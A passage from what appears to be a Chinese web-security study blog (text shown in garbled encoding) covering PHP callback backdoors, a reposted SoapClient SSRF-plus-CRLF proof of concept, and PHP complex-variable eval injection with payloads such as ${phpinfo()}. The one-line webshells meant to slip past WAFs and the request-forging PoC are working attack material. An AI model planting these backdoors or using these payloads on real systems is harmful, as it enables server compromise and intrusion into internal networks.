<p>ç¬¬ä¸€ä¸ªå‚æ•°<code>|.*|e</code>è¡¨ç¤ºçš„æ˜¯<a href="https://blog.csdn.net/windqyoung/article/details/8635418">\eæ¨¡å¼åŒ¹é…</a>ï¼Œå³ä¼šæŠŠreplacementå‚æ•°å½“ä½œPHPè¯­å¥æ¥æ‰§è¡Œï¼Œ<code>.*</code>æ˜¯è´ªå©ªåŒ¹é…ã€‚</p>
<p>é™¤äº†<code>array_walk()</code>ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>array_walk_recurcive()</code>ï¼Œå‚æ•°çš„ä½ç½®éƒ½æ˜¯ä¸€æ ·çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk_recursive($arr, $e, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>çœ‹äº†ä»¥ä¸Šå‡ ä¸ªå›è°ƒåé—¨ï¼Œå‘ç°<code>preg_replace()</code>ç¡®å®å¥½ç”¨ã€‚ä½†æ˜¾ç„¶å¾ˆå¤šWAFéƒ½ä¼šå¯¹å…¶æœ‰æ‰€é˜²å¤‡ã€‚å…¶å®PHPé‡Œä¸æ­¢è¿™ä¸ªå‡½æ•°å¯ä»¥æ‰§è¡Œevalçš„åŠŸèƒ½ï¼Œè¿˜æœ‰å‡ ä¸ªç±»ä¼¼çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace(<span class="string">&#x27;.*&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>å¦å¤–ä¸€ä¸ªï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_filter(<span class="string">&#x27;|.*|e&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2>
<p><a href="https://leavesongs.com/PENETRATION/php-callback-backdoor.html">åˆ›é€ tipsçš„ç§˜ç±â€”â€”PHPå›è°ƒåé—¨</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>å›è°ƒåé—¨</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF+CRLFæ”»å‡»</title>
    <url>/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="ã€è½¬ã€‘åˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF-CRLFæ”»å‡»">ã€è½¬ã€‘åˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF+CRLFæ”»å‡»</h1>
<blockquote>
<p>åŸæ–‡é“¾æ¥ï¼š<a href="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/#">https://lethe.site/2019/09/06/åˆ©ç”¨SoapClientç±»è¿›è¡ŒSSRF-CRLFæ”»å‡»/#</a></p>
<p>å¤ªæ‡’äº†ï¼Œå°±ä¸é‡å¤æ€»ç»“äº†ã€‚è½¬è½½letheå¸ˆå‚…çš„ä¸€ç¯‡æ–‡ç« ï¼Œä¾µæƒåˆ æ–‡ã€‚</p>
</blockquote>
<h2 id="0x01-ä»€ä¹ˆæ˜¯Soap">0x01 ä»€ä¹ˆæ˜¯Soap</h2>
<p>SOAPæ˜¯webServiceä¸‰è¦ç´ ï¼ˆSOAPã€WSDLã€UDDIï¼‰ä¹‹ä¸€ï¼š</p>
<ul>
<li>WSDL ç”¨æ¥æè¿°å¦‚ä½•è®¿é—®å…·ä½“çš„æ¥å£ã€‚</li>
<li>UDDIç”¨æ¥ç®¡ç†ï¼Œåˆ†å‘ï¼ŒæŸ¥è¯¢webServiceã€‚</li>
<li>SOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰æ˜¯è¿æ¥æˆ–WebæœåŠ¡æˆ–å®¢æˆ·ç«¯å’ŒWebæœåŠ¡ä¹‹é—´çš„æ¥å£ã€‚<br>
å…¶é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚</li>
</ul>
<h2 id="0x02-PHPä¸­çš„SoapClientç±»">0x02 PHPä¸­çš„SoapClientç±»</h2>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.php.net/manual/zh/soapclient.soapclient.php">https://www.php.net/manual/zh/soapclient.soapclient.php</a></p>
<p>PHP çš„ SOAP æ‰©å±•å¯ä»¥ç”¨æ¥æä¾›å’Œä½¿ç”¨ Web Servicesï¼Œè¿™ä¸ªæ‰©å±•å®ç°äº†6ä¸ªç±»ï¼Œå…¶ä¸­çš„SoapClientç±»æ˜¯ç”¨æ¥åˆ›å»ºsoapæ•°æ®æŠ¥æ–‡ï¼Œä¸wsdlæ¥å£è¿›è¡Œäº¤äº’çš„ï¼ŒåŒæ—¶è¿™ä¸ªç±»ä¸‹ä¹Ÿæ˜¯æœ‰ååºåˆ—åŒ–ä¸­å¸¸å¸¸ç”¨åˆ°çš„__call()é­”æœ¯æ–¹æ³•ã€‚</p>
<p>è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public SoapClient :: SoapClient (mixed $wsdl [,array $options ])</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ã€‚</p>
<p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®<code>location</code>å’Œ<code>uri</code>é€‰é¡¹ï¼Œå…¶ä¸­<code>location</code>æ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</p>
<p><a href="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/20190906000607209.png"><img src="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/20190906000607209.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></a></p>
<p>çŸ¥é“ä¸Šè¿°ä¸¤ä¸ªå‚æ•°çš„å«ä¹‰åï¼Œå°±å¾ˆå®¹æ˜“æ„é€ å‡ºSSRFçš„åˆ©ç”¨payloadäº†ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥è®¾ç½®ç¬¬ä¸€ä¸ªå‚æ•°ä¸º<code>null</code>ï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°çš„<code>location</code>é€‰é¡¹è®¾ç½®ä¸º<code>target_url</code>ï¼Œå¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://xxx.xxx.xxx&quot;</span>,</span><br><span class="line">                                     <span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å½“æŠŠä¸Šè¿°è„šæœ¬å¾—åˆ°çš„åºåˆ—åŒ–ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼ˆunserializeï¼‰ï¼Œå¹¶æ‰§è¡Œä¸€ä¸ªSoapClientæ²¡æœ‰çš„æˆå‘˜å‡½æ•°æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¯¥ç±»çš„<code>__Call</code>æ–¹æ³•ï¼Œç„¶åå‘<code>target_url</code>å‘é€ä¸€ä¸ªsoapè¯·æ±‚ï¼Œå¹¶ä¸”<code>uri</code>é€‰é¡¹æ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ã€‚</p>
<h2 id="0x03-CRLF-Injection">0x03 CRLF Injection</h2>
<p>CRLFæ˜¯â€å›è½¦ + æ¢è¡Œâ€<code>(\r\n)</code>çš„ç®€ç§°ã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTP Headerä¸HTTP Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTP å†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTP æ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ï¼Œæ‰€ä»¥CRLF Injectionåˆå«HTTP Response Splittingï¼Œç®€ç§°HRSã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š<br>
[CRLF Injectionæ¼æ´çš„åˆ©ç”¨ä¸å®ä¾‹åˆ†æ](<a href="https://wooyun.js.org/drops/CRLF">https://wooyun.js.org/drops/CRLF</a> Injectionæ¼æ´çš„åˆ©ç”¨ä¸å®ä¾‹åˆ†æ.html)</p>
<h2 id="0x04-SSRF-CRLFæ”»å‡»å†…ç½‘">0x04 SSRF+CRLFæ”»å‡»å†…ç½‘</h2>
<p>å®é™…ä¸Šå¾ˆå¤šæ—¶å€™éƒ½éœ€è¦è¿™ä¸¤ä¸ªæ¼æ´é…åˆåœ¨ä¸€èµ·ä½¿ç”¨ï¼Œå½“æˆ‘ä»¬æˆ‘ä»¬å¯ä»¥ä»å¤–ç½‘è°ƒç”¨åˆ°soapçš„apiï¼Œè€Œæ”»å‡»ç›®æ ‡æ˜¯åœ¨å†…ç½‘ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨SoapClientè¿›è¡ŒSSRFæ”»å‡»å†…ç½‘ï¼Œç„¶åé…åˆCRLFæ„é€ POSTè¯·æ±‚å¢åŠ æˆ‘ä»¬çš„æ”»å‡»é¢ã€‚</p>
<p>é‚£ä¹ˆä¸ºä»€ä¹ˆåœ¨ç”¨SoapClientç±»è¿›è¡ŒSSRFçš„æ—¶å€™ä¼šæœ‰CRLFæ³¨å…¥çš„é—®é¢˜å‘¢ï¼Ÿå¦‚ä¸‹ï¼š</p>
<p><a href="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/20190906003122388.png"><img src="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/20190906003122388.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></a></p>
<p>å¯ä»¥çœ‹åˆ°optionså‚æ•°ä¸­è¿˜æœ‰ä¸€ä¸ªé€‰é¡¹ä¸º<code>user_agent</code>ï¼Œè¿è¡Œæˆ‘ä»¬è‡ªå·±è®¾ç½®<code>User-Agent</code>çš„å€¼ã€‚</p>
<p>å½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>User-Agent</code>çš„å€¼æ—¶ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å®Œå…¨å¯ä»¥æ„é€ ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œå› ä¸º<code>Content-Type</code>ä¸ºå’Œ<code>Content-Length</code>éƒ½åœ¨<code>User-Agent</code>ä¹‹ä¸‹ï¼Œè€Œæ§åˆ¶è¿™ä¸¤ä¸ªæ˜¯åˆ©ç”¨CRLFå‘é€postè¯·æ±‚æœ€å…³é”®çš„åœ°æ–¹ã€‚</p>
<p>æœ€åç»™å‡ºwupcoå¸ˆå‚…çš„ç”Ÿæˆä»»æ„POSTæŠ¥æ–‡çš„POC:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&#x27;http://123.206.216.198/bbb.php&#x27;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;a=b&amp;flag=aaa&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: xxxx=1234&#x27;</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ˜¯GETè¯·æ±‚çš„è¯ï¼Œé‚£ä¹ˆæ„é€ å¥½locationå°±è¡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; $url, <span class="string">&#x27;location&#x27;</span> =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span> . urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPå¤æ‚å˜é‡è§£æ</title>
    <url>/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="PHPå¤æ‚å˜é‡è§£æå­¦ä¹ ">PHPå¤æ‚å˜é‡è§£æå­¦ä¹ </h1>
<h2 id="0x01-åŸºç¡€çŸ¥è¯†">0x01 åŸºç¡€çŸ¥è¯†</h2>
<h3 id="å•å¼•å·å’ŒåŒå¼•å·çš„åŒºåˆ«">å•å¼•å·å’ŒåŒå¼•å·çš„åŒºåˆ«</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test=<span class="string">&#x27;hello worldï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$test</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$test&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºçš„ç»“æœæ˜¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello world!</span><br><span class="line">$test</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼ŒPHPä¸­çš„å•å¼•å·ä¼šç›´æ¥è§£ææˆå­—ç¬¦ä¸²ï¼Œè€Œå¦‚æœæ˜¯åŒå¼•å·ï¼Œé‚£ä¹ˆPHPä¼šé¦–å…ˆå»çœ‹åŒå¼•å·é‡Œé¢æœ‰æ²¡æœ‰å˜é‡ï¼Œå¦‚æœæœ‰å˜é‡çš„è¯é‚£ä¹ˆä¼šå…ˆè¿›è¡Œå˜é‡è§£æï¼Œå³æ›¿æ¢æˆå®ƒçš„å€¼ã€‚</p>
<h3 id="å˜é‡çš„è¯†åˆ«">å˜é‡çš„è¯†åˆ«</h3>
<p>é¦–å…ˆçœ‹ä¸€ä¸‹æ–‡æ¡£é‡Œé¢æ˜¯æ€ä¹ˆå®šä¹‰å¤æ‚è§£æçš„</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714091757.png" alt=""></p>
<p>ä¸¾ä¸€ä¸ªä¾‹å­å®¹æ˜“äº†è§£èŠ±æ‹¬å·çš„ä½œç”¨ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;$&#123;test&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$test&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºçš„ç»“æœæ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello world!</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure>
<p>å¦å¤–ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fruit=<span class="string">&quot;apple&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;there are many <span class="subst">&#123;$fruit&#125;</span>s&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">there are many apples</span><br></pre></td></tr></table></figure>
<p>ç»“åˆä¸¤ä¸ªä¾‹å­å¯ä»¥çŸ¥é“ï¼ŒèŠ±æ‹¬å·<strong>èµ·åˆ°æ ‡è®°å˜é‡çš„ç•Œé™çš„ä½œç”¨</strong>ï¼Œåœ¨ç¬¬äºŒä¸ªä¾‹å­ä¸­å¦‚æœæ²¡æœ‰èŠ±æ‹¬å·é‚£ä¹ˆphpå°†ä¼šæŠŠå˜é‡è¯†åˆ«ä¸º$fruitsè¿›è€Œä½¿ç»“æœå¼‚å¸¸ã€‚å¦å¤–ä¹Ÿè¯´æ˜phpä¼šå°½é‡å¤šåœ°å–ç»„åˆå¯ç”¨çš„å­—ç¬¦ä½œä¸ºå˜é‡åã€‚</p>
<h3 id="èŠ±æ‹¬å·ä¸­ä½¿ç”¨å‡½æ•°ï¼Œæ–¹æ³•ï¼Œé™æ€ç±»å˜é‡å’Œç±»å¸¸é‡">èŠ±æ‹¬å·ä¸­ä½¿ç”¨å‡½æ•°ï¼Œæ–¹æ³•ï¼Œé™æ€ç±»å˜é‡å’Œç±»å¸¸é‡</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714091936.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$Hed9eh0g=<span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getname</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hed9eh0g&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hed9eh0g&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;$&#123;getname()&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hed9eh0g</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡ºåœ¨åŒå¼•å·åŒ…è£¹çš„<code>$&#123;&#125;</code>è¿™ç§å½¢å¼å†…éƒ¨å¦‚æœæœ‰æ–¹æ³•åï¼Œåˆ™è¿™ä¸ªæ–¹æ³•æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œæœ¬ä¾‹å­ä¸­é¦–å…ˆæ‰§è¡Œäº†echoè¯­å¥ï¼Œç„¶åå†returnå¯¹åº”çš„å€¼Hed9eh0gï¼Œä¸å¤–å±‚å½¢æˆæ–°çš„ç»“æœâ€‹<code>$&#123;Hed9eh0g&#125;</code>ï¼Œæ­¤æ—¶phpä¼šå°†å…¶è¯†åˆ«ä¸ºä¸€ä¸ªå˜é‡ï¼Œç„¶åè¿›è¡Œè§£æå¹¶æ›¿æ¢æˆå…¶å¯¹åº”çš„ç»“æœã€‚<br>
å¦‚æœå†åœ¨getname()å¤–å±‚åŒ…è£¹ä¸€å±‚â€‹<code>$&#123;&#125;</code>ï¼Œé‚£ä¹ˆç»“æœå°†ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ ¹æ®åˆšæ‰çš„æ¨ç†å¯çŸ¥phpæœ€ç»ˆä¼šè¯†åˆ«$testä¸ºä¸€ä¸ªå˜é‡ï¼Œè€Œè¿™æ˜¯ä¸€ä¸ªæˆ‘ä»¬æ²¡æœ‰å®šä¹‰è¿‡çš„å˜é‡ã€‚<br>
è™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä¸å½±å“getnameå‡½æ•°çš„echoè¯­å¥çš„æ‰§è¡Œã€‚</p>
<h2 id="0x02-ç»ƒä¹ ">0x02 ç»ƒä¹ </h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$str = @(<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$str = &quot;&#x27;</span>.addslashes($str).<span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸¤ç§payloadï¼Œåˆ†åˆ«æ˜¯ï¼š<code>?str=&#123;$&#123;phpinfo()&#125;&#125;</code>å’Œ<code>?str=$&#123;$&#123;phpinfo()&#125;&#125;</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714101545.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714101529.png" alt=""></p>
<p>evalå‡½æ•°å°†å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œå› æ­¤ï¼Œé€šè¿‡å›¾ä¸­ä»£ç æ¸…æ™°å¯è§ç›¸å½“äºå®šä¹‰äº†strå˜é‡ï¼Œèµ‹å€¼ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²<code>&#123;$&#123;phpinfo()&#125;&#125;</code>ã€‚</p>
<p><code>$str = &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;</code>ï¼ŒèŠ±æ‹¬å·å®šä¹‰äº†å˜é‡çš„è¾¹ç•Œï¼Œå› æ­¤è¯¥æ¡è¯­å¥å…ˆæ‰§è¡Œæ‹¬å·ä¸­å†…å®¹ï¼Œè·å–å‡½æ•°è¿”å›å€¼ï¼Œå¹¶ä»¥è¿”å›å€¼çš„stringå‘½åå˜é‡å†èµ‹å€¼ç»™strå˜é‡ã€‚</p>
<p>å¹¶ä¸”ç¬¬äºŒä¸ªpayloadä¼šæŠ¥ä¸€ä¸ªé”™è¯¯</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714101747.png" alt=""></p>
<p>å‡½æ•°phpinfoï¼Œä¼šè¿”å› <code>true</code>ï¼Œå› ä¸º <code>true</code>ï¼Œæ˜¯boolç±»å‹çš„å˜é‡ï¼Œç„¶åè¿›è¡Œç±»å‹è½¬åŒ–ï¼Œè½¬åŒ–ä¸ºå­—ç¬¦ä¸²<code>1</code>,æ‰€ä»¥è°ƒç”¨çš„å‚æ•°å°±æ˜¯<code>$1</code>ï¼Œè¿™ä¹Ÿæ˜¯ä¸Šé¢ç¬¬äºŒä¸ªpayloadæŠ¥é”™ä¸º<code>Undefined variable: 1</code>çš„åŸå› ã€‚</p>
<h2 id="0x03-ç»§ç»­æ€è€ƒ">0x03 ç»§ç»­æ€è€ƒ</h2>
<p>å¦‚æœå°†addslashes ç”¨å•å¼•å·åŒ…è£¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$str &#x3D; @(string)$_GET[&#39;str&#39;];</span><br><span class="line">eval(&quot;$str &#x3D; &#39;&quot;.addslashes($str).&quot;&#39;;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>å†è¯•ä¸€ä¸‹è¿™ä¸¤ä¸ªpayload</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714102044.png" alt=""></p>
<p><code>&#123;$&#123;phpinfo()&#125;&#125;</code>æ‰§è¡Œå¤±è´¥</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714102124.png" alt=""></p>
<p><code>$&#123;$&#123;phpinfo()&#125;&#125;</code>æ‰§è¡ŒæˆåŠŸã€‚</p>
<p>å¤æ‚å˜é‡è§£æçš„å‰ææ˜¯åŒå¼•å·åŒ…è£¹,ç¬¬äºŒæ¬¡å®éªŒä¸­ï¼Œaddslasheså‡½æ•°éƒ¨åˆ†è¢«å•å¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥åªæ˜¯ç®€å•çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å‰é¢<code>$str</code>å´æ˜¯è¢«åŒå¼•å·åŒ…è£¹ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå¤æ‚å˜é‡è§£æã€‚<br>
é‚£ä¹ˆpayload1çš„<code>&#123;$&#123;phpinfo()&#125;&#125;</code>å’Œpayload2çš„â€‹<code>$&#123;$&#123;phpinfo()&#125;&#125;</code>çœ‹æ ·å­éƒ½å¯ä»¥è¿›è¡Œè§£æä¹‹åæ‰§è¡Œå‡½æ•°ï¼Ÿä½†äº‹å®ä¸Šå´åªæœ‰payload2å¯ä»¥å®ç°ã€‚é—®é¢˜å‡ºåœ¨å“ªï¼Ÿ<br>
